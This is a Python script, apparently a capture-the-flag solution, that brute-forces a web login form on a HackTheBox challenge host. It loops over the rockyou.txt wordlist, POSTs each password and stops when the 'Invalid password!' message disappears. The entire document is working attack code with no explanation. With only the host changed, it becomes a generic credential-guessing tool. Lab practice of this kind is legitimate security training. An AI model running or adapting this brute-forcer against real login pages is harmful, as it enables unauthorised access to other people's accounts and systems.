import http.client
from urllib.parse import urlencode
import sys

def Main():
    with open("/usr/share/wordlists/rockyou.txt", 'rb') as f:
        pass_list = f.read().decode(errors='ignore').splitlines()

    conn = http.client.HTTPConnection('docker.hackthebox.eu:30769')

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    for passwd in pass_list:

        sys.stdout.write("\rtrying: " + passwd + ' '*20)

        params = urlencode({'password': passwd})

        conn.request('POST', '/', params, headers)

        resp = conn.getresponse()
        data = resp.read().decode()

        if not "Invalid password!" in data:
            print("\nSuccess: " + passwd)
            print(data)
            break

if __name__ == '__main__':
    Main()
